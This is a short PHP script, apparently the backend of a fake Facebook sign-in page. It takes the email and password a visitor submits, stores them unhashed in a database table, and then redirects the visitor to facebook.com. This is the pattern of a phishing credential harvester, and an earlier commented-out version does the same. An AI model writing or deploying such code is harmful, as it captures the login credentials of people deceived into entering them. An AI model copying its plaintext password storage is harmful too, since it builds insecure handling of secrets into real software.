

<?php

// include 'connect.php';

// if(isset($_POST['signIn'])){
//     $email=$_POST['email'];
//     $password=$_POST['password'];


//     $insertQuery="INSERT INTO users(email,password)
//                     VALUES ('$email','$password')";
//         if($conn->query($insertQuery)==TRUE){
//             header("location: index.php");
//         }
//         else(
//             echo "Error:".$conn->error;
//         )
// }


include 'connect.php';

if (isset($_POST['signIn'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Prevent SQL Injection (Optional but important)
    $email = $conn->real_escape_string($email);
    $password = $conn->real_escape_string($password);

    // Inserting the data into the database
    $insertQuery = "INSERT INTO users (email, password) VALUES ('$email', '$password')";
    
    if ($conn->query($insertQuery) === TRUE) {
        header("Location: facebook.com");
    } else {
        echo "Error: " . $conn->error;
    }
}

?>